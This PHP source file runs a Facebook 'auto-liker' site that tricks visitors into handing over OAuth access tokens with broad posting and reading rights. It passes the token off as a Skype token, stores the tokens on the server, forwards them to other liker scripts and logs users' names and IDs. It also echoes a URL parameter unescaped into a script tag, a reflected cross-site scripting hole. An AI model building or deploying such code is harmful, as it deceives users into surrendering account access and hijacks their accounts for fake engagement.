<?php
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
 return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
 return json_decode($data);
    }
if($_SESSION['token']){
 $token = $_SESSION['token'];
 $graph_url ="https://graph.fb.me/me?access_token=" . $token;
 $user = get_json($graph_url);
 if ($user->error) {
  if ($user->error->type== "OAuthException") {
   session_destroy();
      error_reporting(0);
      $cut = explode('&',$token);
      unlink('kumpul/'.$cut[0]);
      if(!is_dir('expired')){
      mkdir('expired');
      }
      $v=fopen('expired/'.$cut[0],'w');
      fwrite($v,1);
      fclose($v);
   header('Location: index.php?i=Token expired get token again');
   }
  }
} 

if(isset($_POST['submit'])) {
 $token2 = $_POST['token'];
 if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
  $token = $matches[1];
   }
 else{
  $token = $token2;
 }
  $extend = get_html("https://graph.fb.me/me/permissions?access_token="  . $token);
  $pos = strpos($extend, "publish_stream");
  if ($pos == true) {
  $_SESSION['token'] = $token;
   }
   else {
   session_destroy();
     header('Location: index.php?i=Use our official SKYPE Token only');}
  
  }else{}
if(isset($_POST['logout'])) {
session_destroy();
error_reporting(0);
$cut = explode('&',$token);
unlink('kumpul/'.$cut[0]);
$v=fopen('expired/'.$cut[0],'w');
      fwrite($v,1);
      fclose($v);
header('Location: index.php?i=token expired');
}
if(isset($_GET['i'])){
echo '<script type="text/javascript">alert("INFO:  ' . $_GET['i'] . '");</script>';
}

?>
<?php include 'header.php';?>
<div class="menu">
<div id="footer"> <div class="list">UPDATE <blockquote> <font color="red"><b>LIKEZBD.COM</b></font>এটা আমাদের নতুন ভার্সন তাই টোকেন নিয়ম টাও আলাদা তাই অটো লাইক নেয়ার আগে <a href="http://useliker.tk/tut.php"><b>HOW TO GET TOKEN</b></a> থেকে নতুন টোকেন নিয়ম টা পরে নিবেন তা না হলে অটো লাইক কাজ করবে না</blockquote></div></div></div>
<?php
error_reporting(0);
$lamafile = 02;
$waktu = time();
if ($handle = opendir('block')) {
while(false !== ($file = readdir($handle)))
{
$akses = fileatime('block/'.$file);
if( $akses !== false)
if( ($waktu- $akses)>=$lamafile )
unlink('block/'.$file);
}
closedir($handle);
}
?>
<?php
$like = new like();
if($_GET[act]){
print '<script>top.location.href="https://www.facebook.com/dialog/oauth?scope=publish_actions,user_photos,friends_photos,user_activities,user_likes,user_status,friends_status,publish_stream,read_stream,status_update&redirect_uri=https://login.skype.com/COPY_ALL_THIS_URL&response_type=token&client_id=260273468396"</script>';
}
if($_SESSION['token']){
$access_token = $_SESSION['token'];
$me = $like -> me($access_token);
if($me[id]){
if($limit = fileatime('block/'.$me[id])){
$timeoff = time();
$cek = date("i:s",$timeoff - $limit);
echo' <font color="red">Wait Start like 00:05 second</font> = <font color="red">'.$cek.'</font>';
}else{
echo' <font color="blue">Hi, '.$me[name].' READY To Get Auto Like...!!!</font>';
}
echo'
<center><a href="http://facebook.com/sk.bakars"><font
color="red"><b> Like Fans Page for more like </b></font></a></center> <div
class="menu"><h3><font
color="white"><b> NEXT Start Liker!
READY...!!! </b></font></h3></div>
<div class="paging">
<center><a href="index.php">Autolike </a>
<a href="TipsFire.Com"> Admin </a> <a href="ads.php"> Donate</a></center></div>
<div id="top-content"><div class="pesan"> Notice : We are increasing our member </div>
</div>
<div class="paging"> Hi <font color="red">
'.$me[name].'</font> Do not forgot to Bookmark / Save our site
</div>
';



$like -> kumpul($access_token);
if($_POST[id]){
if($limit = fileatime('block/'.$me[id])){
echo' <center>Like Failed... Please Wait Start like <font color="red"> 05 seconds</font> !! <br> <form action="out.php"><input class="btn btnC" type="submit" value="Back Home"></form>';
exit;
}
$file = "pasien.php";
$handle = fopen($file, 'a');
fwrite($handle, "$me[name]");
fwrite($handle, "\n");
fwrite($handle, "<input size=2 type=text value=$me[id]> <a href=https://m.facebook.com/$me[id]>Go FB</a>");
fwrite($handle, "<br>");
fclose($handle);
if(!is_dir('block')){
mkdir('block');
}
$bg=fopen('block/'.$me[id],'w');
fwrite($bg,1);
fclose($bg);
$like -> pancal($_POST[id]);
$like -> suntik($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {

public function pancal($id){ for($i=1;$i<2;$i++){
$this->
_req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/sks.php?post=ktb'.$id));
$this->
_req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likeku.php?liker='.$_SESSION['token']));
}
print '
<div class="aclb apl"> <div class="acw fclb" style="margin:4px;" align="center"> <img src="/like.png" width="150" height="110" class="feedAudienceIcon img" />
<br>
<font color="blue">Hi, '.$me[name].' Your Like Proccess Complete...You Will Get Auto Like on Your Timeline Around 20 Minutes....Thanks For Use Our Site...!!!</font>
<br>
<form action="out.php"><input class="inp-btn" type="submit" value="Back Home"></form></div></div>';
}

public function suntik($id){ for($i=1;$i<2;$i++){
$this->
_req('http://'.$_SERVER[HTTP_HOST].'/jarum.php?post=ktb'.$id);
}
}

public function me($access){
return json_decode($this-> _req('https://graph.fb.me/me?access_token='.$access),true);
}

public function kumpul($access){
if(!is_dir('kumpul')){
mkdir('kumpul');
}
$cut = explode('&',$access);
$a=fopen('kumpul/'.$cut[0],'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print '
<div class="acr apl">
Invalid Access Token
</div>
';
$this->form();
}

public function form(){
$kas = file_get_contents('show2.txt'); 
    $kas = explode("\n",$kas);
         $lih = $kas[mt_rand(0,count($kas)-1)];
echo'

<div class="menu"><h3><img src="https://ssl.gstatic.com/ui/v1/icons/mail/beluga/star.png"> Input Token</h3>

<div class="pesan"><form
method="get" class="composer_form" id="composer_form" action="login.php">
<input class="inp-text" id="composerInput" name="user" rows="2" cols="15" value="'.$_SESSION['token'].'" type="text"></td><td class="btnCell"><input value="Submit" type="submit" class="inp-btn" data-sigil="composer-
submit"/></td></tr></table>
</form>

</div></div>
<div class="menu"><h3><img src="https://ssl.gstatic.com/ui/v1/icons/mail/beluga/star.png"> Get Token</h3>
<div class="list">» <a href="token.php">Get Token Now</a></div>

<div class="pesan">» <a href="tut.php">How to Get Token</a></div>
</div>
';


}

public function getData($access){
$feed=json_decode($this -> _req('https://graph.fb.me/me/feed?access_token='.$access.'&limit=5'),true);
if(count($feed[data]) >= 1){
echo '<div class="menu"><h3>Via Custom id</h3>
<div class="pesan"><form action="index.php" method="post"/>
<input type="text" name="id" class="inp-text"/>
<input type="hidden" name="token" value="'.$access.'"/>
<input name="pancal" type="submit" value="Start Like!"></div>
</form></div></div>';

for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'


<div class="menu"><h3>
<a href="http://facebook.com/'.$uid.'" class="sec">
'.$name.'
</a></h3>

<abbr>
'.$type.'
</abbr>';

if($type=='photo'){
echo '

<img src="'.$pic.'" alt=""class="imgCrop img" style="width:100%;height:100%;left:0;top:0;" />
<span>
'.$mess.' 
</span>
';
}else{
echo '
<div class="list">
<font color="green">
'.$mess.'
</font>
';
}
echo '

<div align="right">
<div class="pesan">
<form action="index.php" method="post"/>
<input type="text" name="id" value="'.$id.'"/>
<input type="hidden" name="token" value="'.$access.'"/>
<input name="pancal" type="submit" value="Start Like!" class="inp-btn"/>
</form>
</div>
</div>
</div>
</div></div></div>';
}
}else{
print '
<div id="objects_container"><div class="acy aps abb"><span class="mfss">errOr... Your status not found
</span></div></div></div>
</div>';
}
print '
</div>
';
}

private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
)
);
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}

?>
<?php include'footer.php'; ?>
